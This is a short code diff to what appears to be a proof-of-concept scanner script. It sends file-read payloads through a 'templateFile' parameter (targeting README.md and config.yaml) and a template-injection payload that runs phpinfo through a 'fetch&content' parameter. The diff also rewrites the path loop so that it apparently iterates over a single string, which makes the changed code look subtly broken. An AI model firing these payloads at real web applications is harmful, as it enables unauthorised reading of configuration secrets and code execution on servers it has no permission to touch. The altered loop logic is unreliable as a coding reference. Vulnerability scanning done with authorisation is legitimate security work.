@@ -22,15 +22,11 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
-            poc_list = ["?a=display&templateFile=README.md",
-                        "?a=display&templateFile=config.yaml",
-                        "?a=fetch&content=<php>die(phpinfo())</php> "]
+            poc_list = ["index.php?a=display&templateFile=README.md",
+                        "index.php?a=display&templateFile=config.yaml",
+                        "index.php?a=fetch&content=<php>die(phpinfo())</php> "]
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, './'):
                     for poc in poc_list:
                         url = path + poc
                         async with session.get(url=url) as res:
